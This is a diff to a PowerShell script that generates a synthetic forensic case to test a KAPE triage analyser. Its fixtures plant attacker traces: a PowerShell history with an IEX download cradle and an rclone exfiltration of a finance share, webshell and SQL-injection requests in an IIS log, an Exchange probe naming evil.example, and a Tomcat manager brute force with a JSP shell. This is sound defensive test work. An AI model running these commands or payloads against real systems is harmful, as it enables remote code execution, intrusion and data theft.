@@ -1,4 +1,4 @@
-<#
+﻿<#
 .SYNOPSIS
   Builds a synthetic KAPE case (EZ Tools module output for three hosts) to test KapeAnalyser.
 
@@ -14,7 +14,7 @@
   Decompressed\, KAPE output in Processed\; KapeAnalyser writes to
   Processed\Level2\). Three different host-folder styles on purpose:
     <Case>\Uploads\                                            (empty here)
-    <Case>\Decompressed\                                       (empty here)
+    <Case>\Decompressed\WS01\, ORC_Server_FS01_...\           raw files only (PowerShell history, IIS log)
     <Case>\Processed\WS01\EventLogs\...                        one folder per host
     <Case>\Processed\ORC_Server_FS01_20261101_120000\...       DFIR ORC archive name
     <Case>\Processed\DC01\2026-11-02T101010\EventLogs\...       KAPE timestamp folder
@@ -255,6 +255,45 @@ Write-Csv @(
     Hb $tIn.AddHours(1).AddMinutes(1) 'info' 4624 'Sec' 'Logon (Network)' 'User: jdoe'
 ) (Join-Path $kape "WS01\EventLogs\hayabusa-timeline.csv")
 
+# PowerShell history (raw file, KAPE target copy) and the same file again in the
+# extracted collection in Decompressed\ (read once)
+$psHist = @'
+Get-ChildItem C:\Users\jdoe\Documents
+IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')
+C:\PerfLogs\rclone.exe copy C:\Shares\Finance remote:loot
+Get-Process | Sort-Object CPU
+Clear-History
+'@
+foreach ($r in (Join-Path $kape 'WS01\C'), (Join-Path $CaseFolder 'Decompressed\WS01\C')) {
+    $p = Join-Path $r 'Users\jdoe\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine'
+    New-Dir $p | Out-Null
+    Set-Content -Path (Join-Path $p 'ConsoleHost_history.txt') -Value $psHist -Encoding UTF8
+}
+
+# SQLECmd browser history and downloads (Chrome)
+$chrome = 'C:\Users\jdoe\AppData\Local\Google\Chrome\User Data\Default\History'
+function Visit($t, $url, $title) {
+    [pscustomobject][ordered]@{ ID = 1; 'VisitTime (UTC)' = (T $t); 'LastVisitedTime (UTC)' = (T $t); URLTitle = $title; URL = $url; VisitCount = 1; TypedCount = 0
+        Hidden = 0; VisitID = 1; FromVisitID = 0; VisitDurationInSeconds = 5; SourceFile = $chrome }
+}
+Write-Csv @(
+    Visit $tIn.AddMinutes(30) 'https://mega.nz/folder/abc123' 'MEGA'
+    Visit $tIn.AddMinutes(31) 'https://mega.nz/file/def456' 'MEGA'
+    Visit $tIn.AddMinutes(6) 'http://198.51.100.7/tools/scan.exe' ''
+    Visit $tIn.AddMinutes(2) 'https://www.example.com/news' 'News'
+    Visit $tIn.AddMinutes(3) 'http://10.10.1.30/intranet' 'Intranet'
+) (Join-Path $kape "WS01\SQLDatabases\${ts}_ChromiumBrowser_HistoryVisits_e1a6b3c2-0000-4000-8000-000000000001.csv")
+function Dl($t, $target, $url, $bytes) {
+    [pscustomobject][ordered]@{ ID = 1; GUID = [guid]::NewGuid(); CurrentPath = $target; TargetPath = $target; OriginalMIMEType = 'application/octet-stream'
+        ReceivedBytes = $bytes; TotalBytes = $bytes; StartTime = (T $t); EndTime = (T $t.AddSeconds(5)); Opened = 0; LastAccessTime = (T $t); LastModified = ''
+        State = 1; DangerType = 0; InterruptReason = 0; ReferrerURL = ''; SiteURL = ''; TabURL = ''; TabReferrerURL = ''; DownloadURL = $url; SourceFile = $chrome }
+}
+Write-Csv @(
+    Dl $tIn.AddMinutes(7) 'C:\Users\jdoe\Downloads\scan.exe' 'http://198.51.100.7/tools/scan.exe' 3145728
+    Dl $tIn.AddMinutes(8) 'C:\Users\jdoe\Downloads\rclone-v1.65-windows-amd64.exe' 'https://downloads.example.org/rclone-v1.65-windows-amd64.exe' 20971520
+    Dl $tIn.AddMinutes(9) 'C:\Users\jdoe\Downloads\invoice.pdf' 'https://www.example.com/invoice.pdf' 102400
+) (Join-Path $kape "WS01\SQLDatabases\${ts}_ChromiumBrowser_Downloads_e1a6b3c2-0000-4000-8000-000000000002.csv")
+
 # ── FS01 (ORC-style folder name) ─────────────────────────────────────
 $fsRoot = Join-Path $kape 'ORC_Server_FS01_20261101_120000'
 $fs = 'FS01.corp.local'
@@ -283,6 +322,44 @@ $mft = @()
 1..25 | ForEach-Object { $mft += Mft ".\Shares\Finance\Dept$_" 'README_RESTORE_FILES.txt' 1200 $tL.AddMinutes(5).AddSeconds($_) }
 $mft += Mft '.\Windows' 'PSEXESVC.exe' 180000 $tL.AddSeconds(3)
 Write-Csv $mft (Join-Path $fsRoot "FileSystem\${ts}_MFTECmd_`$MFT_Output.csv")
+
+# $J: files encrypted and renamed to .lockfs in five share folders, and a
+# burst of 1100 overwrites in one minute
+$usn = @()
+1..150 | ForEach-Object { $usn += Usn ("Q{0}.xlsx.lockfs" -f $_) $tL.AddMinutes(5).AddSeconds($_ * 2) 'RenameNewName' (".\Shares\Finance\Dept{0}" -f ($_ % 5 + 1)) }
+1..1100 | ForEach-Object { $usn += Usn ("f{0}.docx" -f $_) $tL.AddMinutes(6).AddMilliseconds($_ * 50) 'DataOverwrite' '.\Shares\Finance\Dept1' }
+1..40 | ForEach-Object { $usn += Usn ("~WRL{0:D4}.tmp" -f $_) $tL.AddMinutes(-60).AddSeconds($_) 'RenameNewName' '.\Users\jdoe\Documents' }
+Write-Csv $usn (Join-Path $fsRoot "FileSystem\${ts}_MFTECmd_`$J_Output.csv")
+
+# IIS log (raw, only in the extracted ORC collection in Decompressed\): the
+# webshell behind the w3wp.exe -> cmd.exe event, sqlmap, an Exchange probe, noise
+$iis = Join-Path $CaseFolder 'Decompressed\ORC_Server_FS01_20261101_115900\inetpub\logs\LogFiles\W3SVC1'
+New-Dir $iis | Out-Null
+function Iis($t, $method, $stem, $query, $ip, $ua, $status) {
+    '{0} {1} 10.10.1.40 {2} {3} {4} 443 - {5} {6} - {7} 0 0 120' -f $t.ToString('yyyy-MM-dd'), $t.ToString('HH:mm:ss'), $method, $stem, $query, $ip, $ua, $status
+}
+$lines = @('#Software: Microsoft Internet Information Services 10.0', '#Version: 1.0', '#Date: 2026-11-01 08:00:00',
+    '#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken')
+1..20 | ForEach-Object { $lines += Iis $d0.AddMinutes(-60 + $_) 'GET' '/intranet/default.aspx' '-' '10.10.1.21' 'Mozilla/5.0+(Windows+NT+10.0)' 200 }
+$lines += Iis $d0.AddMinutes(-31) 'POST' '/aspnet_client/system_web/shell.aspx' '-' '203.0.113.45' 'Mozilla/5.0' 200
+$lines += Iis $d0.AddMinutes(-30) 'GET' '/aspnet_client/system_web/shell.aspx' 'cmd=whoami' '203.0.113.45' 'Mozilla/5.0' 200
+$lines += Iis $d0.AddMinutes(-29) 'GET' '/aspnet_client/system_web/shell.aspx' 'cmd=net+group+%22domain+admins%22+%2Fdomain' '203.0.113.45' 'Mozilla/5.0' 200
+1..6 | ForEach-Object { $lines += Iis $d0.AddMinutes(-50).AddSeconds($_) 'GET' '/intranet/search.aspx' ("q=1%27+UNION+SELECT+name,{0}+FROM+users--" -f $_) '198.51.100.23' 'sqlmap/1.8#stable+(https://sqlmap.org)' 500 }
+$lines += Iis $d0.AddMinutes(-45) 'GET' '/autodiscover/autodiscover.json' '@evil.example/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.example' '198.51.100.23' 'Mozilla/5.0' 404
+Set-Content -Path (Join-Path $iis 'u_ex261101.log') -Value $lines -Encoding UTF8
+
+# Tomcat access log (KAPE target copy): manager brute force, WAR deploy, JSP shell
+$tc = New-Dir (Join-Path $fsRoot 'C\Tomcat9\logs')
+function Clf($t, $method, $uri, $status, $ip = '198.51.100.99') {
+    '{0} - - [{1}] "{2} {3} HTTP/1.1" {4} 512' -f $ip, ($t.ToString('dd/MMM/yyyy:HH:mm:ss', [Globalization.CultureInfo]::InvariantCulture) + ' +0000'), $method, $uri, $status
+}
+$lines = @()
+1..15 | ForEach-Object { $lines += Clf $d0.AddMinutes(-120).AddSeconds($_ * 2) 'GET' '/manager/html' 401 }
+$lines += Clf $d0.AddMinutes(-119) 'GET' '/manager/html' 200
+$lines += Clf $d0.AddMinutes(-118) 'POST' '/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=ABC' 200
+$lines += Clf $d0.AddMinutes(-117) 'GET' '/update/cmd.jsp?cmd=ipconfig' 200
+$lines += Clf $d0.AddMinutes(-100) 'GET' '/index.jsp' 200 '10.10.1.21'
+Set-Content -Path (Join-Path $tc 'localhost_access_log.2026-11-01.txt') -Value $lines -Encoding UTF8
 
 # ── DC01 (KAPE timestamp folder) ─────────────────────────────────────
 $dcRoot = Join-Path $kape 'DC01\2026-11-02T101010'
